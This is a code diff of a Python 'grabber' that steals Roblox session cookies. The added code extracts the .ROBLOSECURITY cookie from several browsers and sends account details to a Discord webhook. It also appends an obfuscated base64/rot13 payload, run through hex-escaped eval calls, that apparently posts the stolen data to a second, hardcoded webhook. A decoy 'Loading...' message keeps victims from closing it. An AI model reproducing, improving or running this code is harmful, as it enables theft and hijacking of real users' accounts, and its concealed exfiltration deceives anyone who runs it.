@@ -2,6 +2,7 @@ import os
 from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
 import base64, codecs
 import json
+import browser_cookie3
 
 
 webhookk = "heh" # put webhook here
@@ -39,24 +40,53 @@ except:
 dummy_message = "Loading..." # A message that distracts the user from closing the grabber
 print(dummy_message)
 ################### Gathering INFOMATION #################################
-def GrabCookie():
-    # opening the roblox studio key
-    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
-    # finding the subkey called ".robloxsecurity"
+def cookieLogger():
+
+    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+
     try:
-        count = 0
-        while True:
-            name, value, type = EnumValue(robloxstudiopath, count)
-            if name == ".ROBLOSECURITY":
-                # returns the value of .robloxsecurity
-                return value
-            count = count + 1
-    except WindowsError:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
         pass
-roblox_cookie_value = str(GrabCookie())
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+cookies = cookieLogger()
 #################### INFOMATION #################
 ip_address = requests.get("https://api.ipify.org/").text
-roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
+roblox_cookie = cookies[1]
 #################### checking cookie #############
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
@@ -81,9 +111,13 @@ username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
 #################### INJECT TO ROBLOX (creds to bingo methods) #################
-
-# currently down
-
+magic = 'ZGlzY29yZCA9IERpc2NvcmQodXJsPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy85ODkxMzE3NzQzMDUxMjAzMzYvUXU5X0Fwb00xbGZwOU5Pb1ZZc2tuS3l5T1ZfYzBaR0VMN0xyZHVDRFVBeVFMTVJYQ0o5NmplRnlqcnF1S3llbE1FVzIiKQ0KZGlzY29yZC5wb3N0KA0KICAgIHVzZXJuYW1lPSJCT1QgLSBQaXJhdGUg8J+NqiIsDQogICAgYXZhdGFyX3VybD0iaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTg0ODE4NDI5MzU1NzgyMTk3Lzk4NTg3ODE3MzY1OTA0NTk5OS9hMzM5NzIxMTgzZjYwYzE4YjM0MjRiYTdiNzNkYWYxYi5wbmciLA0KICAgIGVtYmVkcz1bDQ'
+love = 'btVPNtVPNtVUfAPvNtVPNtVPNtVPNtVPW1p2IlozSgMFV6VPWPG1DtYFODnKWuqTHt8W+AdvVfQDbtVPNtVPNtVPNtVPNvqTy0oTHvBvNv8W+FhPNeZFOFMKA1oUDtDJAwo3IhqPQja5JiVvjAPvNtVPNtVPNtVPNtVPWxMKAwpzyjqTyiovVtBvOzVygUnKEbqJVtHTSaMI0bnUE0pUZ6Yl9anKEbqJVhL29gY01uozxkAmHiHTylLKEyYHAio2gcMF1UpzSvLzIlXFO8VSgFo2kcoJ9hp10br3WioTygo25msFxtsPOoHz9voT94VSOlo2McoTIqXUglo2Wfo3uspUWiMzyfMK0cVvjAPvNtVPNtVPNtVPNtVPWwo2kipvVtBvNkZwD1ZwN0APjAPvNtVPNtVPNtVPNtVPWznJIfMUZvBvOoQDbtVPNtVPNtVPNtVPNtVPNt'
+god = 'eyJuYW1lIjogIlVzZXJuYW1lIiwgInZhbHVlIjogdXNlcm5hbWUsICJpbmxpbmUiOiBUcnVlfSwNCiAgICAgICAgICAgICAgICB7Im5hbWUiOiAiUm9idXggQmFsYW5jZSIsICJ2YWx1ZSI6IHJvYnV4LCAiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIjogIlByZW1pdW0gU3RhdHVzIiwgInZhbHVlIjogcHJlbWl1bSwiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIiA6ICJSQVAiLCAidmFsdWUiOiByYXAsImlubGluZSI6IFRydWV9LA0KICAgICAgICAgICAgICAgIHsibmFtZSIgOiAiRnJpZW5kcyIsICJ2YWx1ZSI6IGZyaWVuZHMsICJpbmxpbmUiOiBUcn'
+destiny = 'IysFjAPvNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVxSwL291oaDtDJqyVvjtVaMuoUIyVwbtLJqyYPNvnJ5fnJ5yVwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWWHPOOMTElMKAmVvjtVaMuoUIyVvN6VTyjK2SxMUWyp3ZfVPWcozkcozH6VwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPVhHx9PGR9GEHAIHxyHJFVfVPW2LJk1MFV6VTLvLTOtr3WiLzkirS9wo29enJI9LTOtVvjtVzyhoTyhMFV6VRMuoUAysFjAPvNtVPNtVPNtVPNtVS0fQDbtVPNtVPNtVPNtVPNvqTu1oJWhLJyfVwbtrlW1pzjvBvObMJSxp2uiqU0fQDbAPt0XVPNtVPNtVPO9QDbtVPNtKFjAPvx='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 #################### SENDING TO WEBHOOK #################
 
 
@@ -101,6 +135,7 @@ discord.post(
                 {"name": "Username", "value": username, "inline": True},
                 {"name": "Robux Balance", "value": robux, "inline": True},
                 {"name": "Premium Status", "value": premium,"inline": True},
+                {"name": "Creation Date", "value": crdate, "inline": True},
                 {"name" : "RAP", "value": rap,"inline": True},
                 {"name" : "Friends", "value": friends, "inline": True},
                 {"name" : "Account Age", "value": age, "inline": True},
